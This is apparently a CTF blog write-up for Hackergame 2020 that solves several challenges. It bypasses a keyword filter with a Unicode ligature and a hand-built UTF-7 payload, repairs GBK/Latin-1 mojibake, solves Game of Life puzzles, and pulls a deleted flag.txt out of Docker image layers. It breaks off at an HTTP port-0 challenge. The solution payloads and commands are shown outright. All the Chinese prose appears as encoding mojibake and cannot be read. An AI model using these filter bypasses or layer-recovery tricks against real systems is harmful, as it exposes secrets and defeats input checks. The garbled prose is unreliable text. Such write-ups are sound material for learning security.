punctuation">;</span>m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182511614.png" alt="flag"></p><hr><h2 id="233-åŒå­¦çš„å­—ç¬¦ä¸²å·¥å…·"><a href="#233-åŒå­¦çš„å­—ç¬¦ä¸²å·¥å…·" class="headerlink" title="233 åŒå­¦çš„å­—ç¬¦ä¸²å·¥å…·"></a>233 åŒå­¦çš„å­—ç¬¦ä¸²å·¥å…·</h2><p>é¢˜ç›®æ‰€ç»™å…³é”®ä»£ç å¦‚ä¸‹ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">to_upper</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'FLAG'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">to_utf8</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># make it bytes</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="å­—ç¬¦ä¸²å¤§å†™å·¥å…·"><a href="#å­—ç¬¦ä¸²å¤§å†™å·¥å…·" class="headerlink" title="å­—ç¬¦ä¸²å¤§å†™å·¥å…·"></a><strong><strong>å­—ç¬¦ä¸²å¤§å†™å·¥å…·</strong></strong></h3><p>å¾—çœ‹çœ‹å•¥å­—ç¬¦ç»è¿‡ <code>upper</code> æ–¹æ³•å‡ºæ¥å°±æ˜¯ <code>flag</code> æˆ–è€…å…¶ä¸­æŸä¸ªå­—ç¬¦ã€‚</p><p>è¿™é‡Œå°±ç¡¬æ˜¯è·‘å‡ºæ¥çš„ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'f'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'F'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ï¬‚'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">'ï¬‚'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103155334679.png" alt="æ±‚è§£å­—ç¬¦"></p><p><strong>payload:</strong></p><p><code>ï¬‚ag</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103014034671.png" alt="flag1"></p><p><code>flag{badunic0debadbad_xxxxxxxx}</code></p><p>Unicode å¤ªå¥‡å¦™äº†ï¼æ®è¯´è¿™å«åš <strong>unicode å­—ç¬¦æŠ˜å /åˆå­—</strong>ï¼ˆï¼Ÿï¼‰</p><blockquote><p>Extensive Reading:</p><p><a href="https://blog.csdn.net/csdnnews/article/details/103516231">CSDN: äº†ä¸èµ·çš„ Unicodeï¼</a></p></blockquote><h3 id="UTF-7-åˆ°-UTF-8-è½¬æ¢å·¥å…·"><a href="#UTF-7-åˆ°-UTF-8-è½¬æ¢å·¥å…·" class="headerlink" title="UTF-7 åˆ° UTF-8 è½¬æ¢å·¥å…·"></a>UTF-7 åˆ° UTF-8 è½¬æ¢å·¥å…·</h3><p><code>s.encode()</code>å’Œ <code>decode()</code> é»˜è®¤ç”¨çš„ utf-8 ç¼–ç ï¼Œè¿™é‡Œç”¨ utf-7 ç¼–ç å†ç”¨ utf-7 è§£ç å°±èƒ½å flag äº†ã€‚</p><p>æœ€å¼€å§‹ç”¨ Python çš„ <code>'flag'.encode('utf-7')</code> æ–¹æ³•ï¼Œå‘ç°å‡ºæ¥ç»“æœå°±æ˜¯ <code>b'flag'</code>ï¼Œå‚»äº†ã€‚</p><p>ä¹‹åå»æŸ¥äº† <a href="https://zh.wikipedia.org/wiki/UTF-7">UTF-7 çš„ç»´åŸºç™¾ç§‘</a>ï¼Œå†³å®šè‡ªå·±æŒ‰ç…§ç¼–ç æµç¨‹èµ°ä¸€éå§ã€‚</p><p>ï¼ˆæ²¡æ³¨æ„æ˜¯ <strong>UTF-16 å¤§ç«¯åº</strong>ï¼Œæˆ‘è¯•äº†åŠå¤©å‘ç°æœ€åæ˜¯å¤§å°ç«¯çš„é—®é¢˜ï¼Œäººå‚»äº†ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011526169.png" alt="ç¼–ç æ–¹æ³•"></p><p>é¦–å…ˆå°† <code>flag</code> è½¬æ¢ä¸º UTF-16(BE) (1201)ï¼Œå³ä¸‹é¢çš„ <code>x</code>ã€‚</p><p>è€Œåæ¯å…­ä½ä¸€ç»„è¿›è¡Œ base64 ç¼–ç ï¼Œè¿™é‡Œç›´æ¥ç”¨ base64 æ¨¡å—çš„æ–¹æ³•äº†ã€‚</p><p>æœ€åå»æ‰æœ«å°¾çš„ <code>=</code>ï¼Œåœ¨æœ€å‰é¢åŠ ä¸Š <code>+</code>ï¼Œå³å¯å¾—åˆ° UTF-7 ç¼–ç ã€‚</p><pre class="language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">b'\x00\x66\x00\x6c\x00\x61\x00\x67'</span>y <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># b'AGYAbABhAGc='</span><span class="token string">b'+AGYAbABhAGc='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span><span class="token comment"># 'flag'</span></code></pre><p><strong>payload:</strong></p><p><code>+AGYAbABhAGc</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103010408030.png" alt="flag2"></p><p><code>flag{please_visit_www.utf8everywhere.org_25xxxxxx}</code></p><p><a href="https://utf8everywhere.org/">https://utf8everywhere.org/</a>  å•Š UTF-8 ç¼–ç ç¡®å®æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011937989.png" alt="facts"></p><p><em>è‰ï¼Œæƒ³æƒ³å°±æ°”ï¼ˆ</em></p><hr><h2 id="ä»é›¶å¼€å§‹çš„ç«æ˜Ÿæ–‡ç”Ÿæ´»"><a href="#ä»é›¶å¼€å§‹çš„ç«æ˜Ÿæ–‡ç”Ÿæ´»" class="headerlink" title="ä»é›¶å¼€å§‹çš„ç«æ˜Ÿæ–‡ç”Ÿæ´»"></a>ä»é›¶å¼€å§‹çš„ç«æ˜Ÿæ–‡ç”Ÿæ´»</h2><blockquote><p>L åŒå­¦æ‰“å¼€é™„ä»¶ä¸€çœ‹ï¼Œå‚»çœ¼äº†ï¼Œå…¨éƒ½æ˜¯æ„ä¹‰ä¸æ˜çš„æ±‰å­—ã€‚æœºæ™ºçš„ L åŒå­¦æƒ³åˆ° Q åŒå­¦å¹³æ—¶å–œæ¬¢ä½¿ç”¨ <strong>GBK ç¼–ç </strong>ï¼Œä¹Ÿè®¸æ˜¯æ‰“å¼€æ–¹å¼ä¸å¯¹ã€‚ç»“æœç”¨ GBK æ‰“å¼€å´çœ‹åˆ°äº†ä¸€å †å¤¹æ‚ç€æ—¥è¯­å’Œæ•°å­—çš„<strong>ç«æ˜Ÿæ–‡</strong>â€¦â€¦</p><p>L åŒå­¦å½»åº•æ‡µé€¼äº†ï¼Œå‡ ç»å‘¨æŠ˜ï¼ŒTA æ‰¾åˆ°äº†ç§‘å¤§æœ€è´Ÿç››åçš„ç«æ˜Ÿæ–‡ä¸“å®¶ (ä½ )ã€‚ä¾é å¤šå¹´çš„å­—ç¬¦ç¼–ç è§£ç çš„ç»éªŒï¼Œä½ å¯ä»¥ç ´è¯‘ Q åŒå­¦å‘æ¥çš„ç«æ˜Ÿæ–‡æ˜¯ä»€ä¹ˆæ„æ€å—ï¼Ÿ</p><p>æ³¨ï¼šæ­£ç¡®çš„ flag å…¨éƒ¨ç”± <strong>ASCII</strong> å­—ç¬¦ç»„æˆï¼</p></blockquote><p>æœ‰å¤§ä½¬å‘ç°äº†ä¸€ä¸ª<strong>ç¼–è§£ç ç½‘ç«™</strong>ï¼š<a href="http://www.mytju.com/classcode/tools/messyCodeRecover.asp">http://www.mytju.com/classcode/tools/messyCodeRecover.asp</a></p><p>èƒ½å¤ŸçŒœæµ‹åŸæ¥å’Œå¯èƒ½çš„ç¼–è§£ç æ–¹å¼ã€‚</p><p><em>ï¼ˆBTW, è¿™ä¸ªç½‘ç«™ä¸æ˜¯æœ¬åœ°è·‘çš„ï¼Œè¯·æ³¨æ„ä¿¡æ¯å®‰å…¨</em></p><p>æ ¹æ®æç¤ºï¼Œåº”è¯¥æ˜¯å…ˆç”¨ GBK æ¥è§£ç ï¼ŒGBK =&gt; UTF-8ï¼Œç„¶è€Œç»“æœåƒè¿™æ ·ï¼š</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231901155.png" alt="GBK => UTF-8"></p><p>å‘ç°ä¸å¯¹åŠ²ï¼Œåº”è¯¥åè¿‡æ¥ï¼Œæ˜¯ UTF-8 =&gt; GBKã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104232120053.png" alt="UTF-8 => GBK"></p><p>ç„¶åå†æŠŠæ‹¿å»æ¢å¤ã€‚</p><p>å‘ç°æ˜¯è¦ç”¨ GBK æ¥è¯»ï¼Œå†è½¬æ¢åˆ° iso-8859-1ï¼Œå³ Latin1ï¼ˆ28591ï¼‰ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104231650349.png" alt="flag"></p><p>è¦ä¸ç„¶å°± python å†™è„šæœ¬ã€‚ï¼ˆè´¼æƒ³ä¸é€šè¿™é‡Œï¼Œä½›äº†</p><p><strong>str == encode ==&gt; bytes == decode ==&gt; str</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'gibberish_message.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    content <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>content1 <span class="token operator">=</span> content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>content2 <span class="token operator">=</span> content1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content2<span class="token punctuation">)</span>content3 <span class="token operator">=</span> content2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201104233010095.png" alt="python decode"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥åœ¨ Linux ä¸‹å€ŸåŠ© <code>iconv</code></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> gibberish_message.txt  <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t gbk <span class="token operator">|</span> <span class="token function">iconv</span> -f utf8 -t latin1 <span class="token operator">|</span> <span class="token function">iconv</span> -f gbk -t utf8 <span class="token operator">&gt;</span> <span class="token number">1</span>.txt<span class="token comment"># OR (utf-8 for default)</span><span class="token comment"># cat gibberish_message.txt  | iconv -t gbk | iconv -t latin1 | iconv -f gbk</span></code></pre><p>å¾—åˆ°æ–‡ä»¶å†…å®¹</p><pre class="language-none"><code class="language-none">æˆ‘æ”»ç ´äº† ï¼¨ï½ï½ƒï½‹ï½…ï½’ï½‡ï½ï½ï½… çš„æœåŠ¡å™¨ï¼Œå·åˆ°äº†å®ƒä»¬çš„ ï½†ï½Œï½ï½‡ï¼Œç°åœ¨æˆ‘æŠŠ ï½†ï½Œï½ï½‡ å‘ç»™ä½ ï¼šï½†ï½Œï½ï½‡ï½›ï¼¨ï¼”ï½–ï¼“ï¼¿ï¼¦ï½•ï¼®ï¼¿ï½—ï¼‘ï¼´ï½ˆï¼¿ï¼“ï½ï½ƒï¼ï½„ï¼‘ï½ï½‡ï¼¿ï¼”ï¼®ï½„ï¼¿ï½„ï¼“ï½ƒï¼ï¼¤ï¼‘ï½ï¼§ï¼¿xxxxxxï½å¿«å»æ¯”èµ›å¹³å°æäº¤å§ï¼ä¸è¦å†æŠŠè¿™ä»½ä¿¡æ¯è½¬å‘ç»™å…¶ä»–äººäº†ï¼Œè¦æ˜¯è¢«å‘ç°å°±ç³Ÿç³•äº†ï¼</code></pre><p><code>flag{H4v3_FuN_w1Th_3nc0d1ng_4Nd_d3c0D1nG_xxxxxx}</code></p><hr><h2 id="è¶…ç®€å•çš„ä¸–ç•Œæ¨¡æ‹Ÿå™¨"><a href="#è¶…ç®€å•çš„ä¸–ç•Œæ¨¡æ‹Ÿå™¨" class="headerlink" title="è¶…ç®€å•çš„ä¸–ç•Œæ¨¡æ‹Ÿå™¨"></a>è¶…ç®€å•çš„ä¸–ç•Œæ¨¡æ‹Ÿå™¨</h2><p>å‚è€ƒï¼š</p><p><a href="https://en.wikipedia.org/wiki/Conway's_Game_of_Life">wikipedia: Conwayâ€™s Game of Life</a></p><p><a href="https://zhuanlan.zhihu.com/p/261431820">å­¦æœ¯å¹²è´§ | Conwayâ€™s Game of Life ç”Ÿå‘½æ¸¸æˆçš„å»ºç­‘è®¾è®¡åº”ç”¨</a></p><p>è¿™é‡Œæœ‰ä¸ª<strong>æ¨¡æ‹Ÿå™¨</strong>ï¼š<a href="https://nealwang.net/JustForFun/GameOfLife.html">https://nealwang.net/JustForFun/GameOfLife.html</a></p><p>ä¹ŸæŒºæœ‰æ„æ€çš„ã€‚</p><p>ä¸¤ä¸ªæ­£æ–¹å½¢çš„ç¬¬ä¸€è¡Œåˆ†åˆ«ä½äºç¬¬6è¡Œï¼Œç¬¬26è¡Œã€‚</p><h3 id="è´è¶æ•ˆåº”"><a href="#è´è¶æ•ˆåº”" class="headerlink" title="è´è¶æ•ˆåº”"></a>è´è¶æ•ˆåº”</h3><p>æ¶ˆé™¤ç¬¬ä¸€ä¸ªæ­£æ–¹å½¢ï¼š</p><p>ä¸‹é¢ LWSS è¿™ä¸ªå›¾å½¢èƒ½æ°´å¹³å‘å³ç§»åŠ¨ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154425315.png"></p><p>è€Œ Glinder è¿™ä¸ªå›¾å½¢èƒ½å‘å³ä¸‹è§’45Â°æ–¹å‘ç§»åŠ¨ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154500247.png" alt="image-20201103154500247"></p><pre class="language-none"><code class="language-none">000000000000000000000000000000000000000000000000000000000000000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# Or000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101172719778.png" alt="flag"></p><p>æµ‹è¯•ä¸­å‘ç°è¿™äº›èƒ½æ¸…é™¤ä¸‹é¢çš„æ­£æ–¹å½¢ï¼ˆï¼ˆ</p><pre class="language-none"><code class="language-none">000000000000000000000000000000000000000000000000000000010000000000000001000100100000111000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# OR000000000000000000000000000100000000000000010000000000001110000000000000000100100000000000000010000000000100010000000000011110000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></pre><h3 id="ä¸€çŸ³äºŒé¸Ÿ"><a href="#ä¸€çŸ³äºŒé¸Ÿ" class="headerlink" title="ä¸€çŸ³äºŒé¸Ÿ"></a>ä¸€çŸ³äºŒé¸Ÿ</h3><p>éœ€è¦åŒæ—¶æ¶ˆé™¤ä¸¤ä¸ªæ­£æ–¹å½¢ã€‚</p><p>è¯•äº†å¥½ä¹…æ²¡å‡ºæ¥ï¼Œæœ€åè¿˜æ˜¯çæ”¹å‡ºæ¥çš„233ã€‚</p><p>å‘ç°ä¸‹é¢è¿™ä¸ªå›¾å½¢èƒ½å‘å¤–æ‰©æ•£ï¼Œäºæ˜¯è¯•è¯•ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154324961.png"></p><pre class="language-none"><code class="language-none">000000000000000000000000000000000000000000000000000000000000000000000000000000000000010010000000000000001000000000010001000000000001111000000000000000000000000000000001100000000000000100000000000011100000000000000000000000000</code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103154207576.png" alt="flag2"></p><hr><h2 id="233-åŒå­¦çš„-Docker"><a href="#233-åŒå­¦çš„-Docker" class="headerlink" title="233 åŒå­¦çš„ Docker"></a>233 åŒå­¦çš„ Docker</h2><blockquote><p>233 åŒå­¦åœ¨è½¯å·¥è¯¾ä¸Šå­¦åˆ°äº† Docker è¿™ç§æ–¹ä¾¿çš„ä¸œè¥¿ï¼Œäºæ˜¯ç»™è‡ªå·±çš„å­—ç¬¦ä¸²å·¥å…·é¡¹ç›®å†™äº†ä¸€ä¸ª Dockerfileã€‚</p><p>ä½†æ˜¯ 233 åŒå­¦çªç„¶å‘ç°å®ƒä¸å°å¿ƒæŠŠä¸€ä¸ªç§å¯†æ–‡ä»¶ï¼ˆ<code>flag.txt</code>ï¼‰æ‰“åŒ…è¿›å»äº†ï¼Œäºæ˜¯å†™äº†ä¸€è¡Œå‘½ä»¤åˆ æ‰è¿™ä¸ªæ–‡ä»¶ã€‚</p><p>ã€Œæ—¢ç„¶å·²ç»åˆ æ‰äº†ï¼Œåº”è¯¥ä¸ä¼šè¢«äººæ‰¾å‡ºæ¥å§ï¼Ÿã€233 æƒ³é“ã€‚</p><ul><li>Docker Hub åœ°å€ï¼š<a href="https://hub.docker.com/r/8b8d3c8324c7/stringtool">8b8d3c8324c7/stringtool</a></li></ul></blockquote><p>é¦–å…ˆæŠŠé•œåƒæ‹‰ä¸‹æ¥</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker pull 8b8d3c8324c7/stringtool</code></pre><p>åœ¨ <a href="https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore">Image Layers</a> é‡Œå¯ä»¥çœ‹åˆ°åˆ é™¤ <code>flag.txt</code> çš„å±‚ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101000901233.png" alt="Image Layers"></p><p>æˆ–è€…</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">history</span> 8b8d3c8324c7/stringtool</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å°±æ‰¾ä¸€æ‰¾æ„å»ºè¿‡ç¨‹ä¸­çš„æ–‡ä»¶å¥½äº†ã€‚</p><p>æŠŠé•œåƒå¯¼å‡ºæ¥ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker save 8b8d3c8324c7/stringtool <span class="token operator">&gt;</span> images.tar</code></pre><blockquote><p>BTW, <code>docker save</code> ç”¨æ¥å°†ä¸€ä¸ªæˆ–å¤šä¸ª <strong>image</strong> æ‰“åŒ…ä¿å­˜ï¼Œè€Œ <code>docker export</code> ç”¨æ¥å°† <strong>container</strong> çš„æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œæ‰“åŒ…ã€‚</p><p><code>docker load</code> ç”¨æ¥è½½å…¥é•œåƒåŒ…ï¼Œ<code>docker import</code> ç”¨æ¥è½½å…¥å®¹å™¨åŒ…ï¼Œä½†ä¸¤è€…éƒ½ä¼šæ¢å¤ä¸ºé•œåƒï¼›</p><p><code>docker load</code> ä¸èƒ½å¯¹è½½å…¥çš„é•œåƒé‡å‘½åï¼Œè€Œ <code>docker import</code> å¯ä»¥ä¸ºé•œåƒæŒ‡å®šæ–°åç§°ã€‚</p><p>ï¼ˆå‚è€ƒ <a href="https://blog.csdn.net/liukuan73/article/details/78089138">docker saveä¸docker exportçš„åŒºåˆ«</a>ï¼‰</p></blockquote><p>åœ¨é‡Œé¢æ‰¾åˆ°äº†ã€‚<em>ï¼ˆè¯è¯´æœ‰æ²¡æœ‰å¿«ä¸€ç‚¹çš„æ–¹æ³•å”‰</em></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001523820.png" alt="images"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101001540120.png" alt="flag">    </p><p><code>flag{Docker_Layers!=PS_Layers_hhh}</code></p><p>é¡ºä¾¿çœ‹äº†ä¸€çœ¼ Dockerfileã€‚</p><pre class="language-dockerfile" data-language="dockerfile"><code class="language-dockerfile"># Set the base image to use to centos 7FROM centos:7# Set the file maintainerMAINTAINER Software_Engineering_Project# Install necessary toolsRUN yum -y install wget make yum-utils# Install python dependenciesRUN yum-builddep python -y# Install tools neededRUN yum -y install gccRUN yum -y install vimRUN yum -y install mariadb-devel# Download the python3.7.3RUN wget -O /tmp/Python-3.7.3.tgz https://www.python.org/ftp/python/3.7.3/Python-3.7.3.tgz# Build and install python3.7.3RUN tar -zxvf /tmp/Python-3.7.3.tgz -C /tmp/RUN /tmp/Python-3.7.3/configureRUN make &amp;&amp; make install# Create symbolic linkRUN rm -f /usr/bin/pythonRUN ln -s /usr/local/bin/python3 /usr/bin/pythonRUN ln -s /usr/local/bin/pip3 /usr/bin/pip# Upgrade the pipRUN pip install --upgrade pip# Fix the yumRUN sed -i 's/python/python2/' /usr/bin/yum# CleanRUN rm -rf /tmp/Python-3.7.3*RUN yum clean allRUN pip3 install ipythonRUN pip3 install bpythonRUN pip3 install pipenvENV PYTHONUNBUFFERED 1RUN mkdir /codeWORKDIR /codeCOPY . /code/RUN rm /code/flag.txtENTRYPOINT python /code/app.py</code></pre><p>æ¯ä¸€æ¬¡ RUN éƒ½æ˜¯æ–°å¼€ä¸€ä¸ªå®¹å™¨æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼Œåœ¨å½“å‰é•œåƒåŸºç¡€ä¸Šæ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œå¹¶æäº¤ä¸ºæ–°çš„é•œåƒã€‚</p><p>æŸç§ç¨‹åº¦ä¸Šå¯ä»¥è¯´é•œåƒæ˜¯ä¸€ä¸ªåˆ†å±‚çš„æ–‡ä»¶ç³»ç»Ÿã€‚Docker é•œåƒå®é™…ä¸Šå°±æ˜¯ç”±è¿™æ ·çš„ä¸€å±‚å±‚æ–‡ä»¶è¿›è¡Œå åŠ èµ·æ¥çš„ï¼Œä¸Šå±‚çš„æ–‡ä»¶ä¼šè¦†ç›–ä¸‹å±‚çš„åŒåæ–‡ä»¶ã€‚è€Œå„å±‚é‡Œæœ‰é‡å¤çš„æ–‡ä»¶ï¼Œå› æ­¤é•œåƒè¦å¤§å¾—å¤šã€‚è¿™äº›å±‚åˆå¹¶åœ¨ä¸€èµ·å°±æˆäº†å®¹å™¨é‡Œçš„å†…å®¹ã€‚</p><p>ä¹Ÿæ­£æ˜¯å¦‚æ­¤ï¼Œflag ä¹Ÿèƒ½å¤Ÿè¢«æ‰¾åˆ°äº†23333.</p><hr><h2 id="ä»é›¶å¼€å§‹çš„-HTTP-é“¾æ¥"><a href="#ä»é›¶å¼€å§‹çš„-HTTP-é“¾æ¥" class="headerlink" title="ä»é›¶å¼€å§‹çš„ HTTP é“¾æ¥"></a>ä»é›¶å¼€å§‹çš„ HTTP é“¾æ¥</h2><blockquote><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œæ•°ç»„ä¸‹æ ‡åº”å½“ä» 0 å¼€å§‹ã€‚</p><p>åŒæ ·çš„ï¼ŒTCP ç«¯å£ä¹Ÿåº”å½“ä» 0 å¼€å§‹ã€‚ä¸ºäº†å®è·µè¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æŠŠä¸€ä¸ªç½‘ç«™æ¶è®¾åœ¨æœåŠ¡å™¨çš„ 0 å·ç«¯å£ä¸Šã€‚</p><p>ä½ èƒ½æˆåŠŸè¿æ¥åˆ° 0 å·ç«¯å£å¹¶æ‹¿åˆ° flag å—ï¼Ÿ</p><p><strong>ç‚¹å‡»ä¸‹é¢çš„æ‰“å¼€é¢˜ç›®æŒ‰é’®æ˜¯æ— æ³•æ‰“å¼€ç½‘é¡µçš„ï¼Œå› ä¸ºæ™®é€šçš„æµè§ˆå™¨ä¼šè®¤ä¸ºè¿™æ˜¯æ— 